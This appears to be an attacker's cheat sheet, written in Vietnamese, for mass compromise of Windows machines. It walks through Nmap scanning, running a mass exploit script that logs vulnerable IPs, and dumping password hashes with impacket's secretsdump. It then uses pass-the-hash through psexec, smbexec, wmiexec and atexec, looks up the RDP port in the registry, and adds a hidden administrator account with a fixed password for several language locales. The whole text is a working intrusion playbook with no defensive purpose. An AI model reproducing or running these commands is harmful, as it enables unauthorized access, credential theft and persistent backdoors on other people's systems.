B1: cd impacket/ && pip install .
---
B2: [Scanner]
cd scanner/
Cai Nmap 5.51
Windows: 
run file windows.bat
Linux:
bash linux.sh
Ngồi treo thôi ~~
B3: [Exploit]
python mass.py <file ip>
Ngoi treo tiep
Exploit Success nó luư ở good.txt
xong rùi
--
chmod +x q
./q good.txt
<secretdump> [Dùng trên linux mới hiệu quả cao/ Windows dởm lắm]
<:udomain>						               <:nthash>
    |							                   |
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a061ccad5368c464a021120bb32496:::
<:nthash> a061ccad5368c464a021120bb32496
<:udomain> Administrator
<:a061ccad5368c464a021120bb32496 Ad/Administrator@ip.ip.ip.ip>
<psexec>
Nếu cái psexec không hiệu quả thì dùng smbexec, wmiexec, atexec,..
--
<> print
'' command atexec
<python atexec.py -hashes :a061ccad5368c464a021120bb32496 Ad/Administrator@ip.ip.ip.ip 'command'>
còn smbexec, psexec, wmiexec command option giống nhau
smbexec,psexec - port 445
wmiexec - port 135
atexec - port 445
Command tìm port rdp
REG QUERY "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
0xd3d = 3389
-----
net user oliver N0th1ng@! /add && net localgroup Administrators oliver /add [English]
net user oliver N0th1ng@! /add && net localgroup Administratoren oliver /add [Germany]
net user oliver N0th1ng@! /add && net localgroup Administradores oliver /add [Turkey]
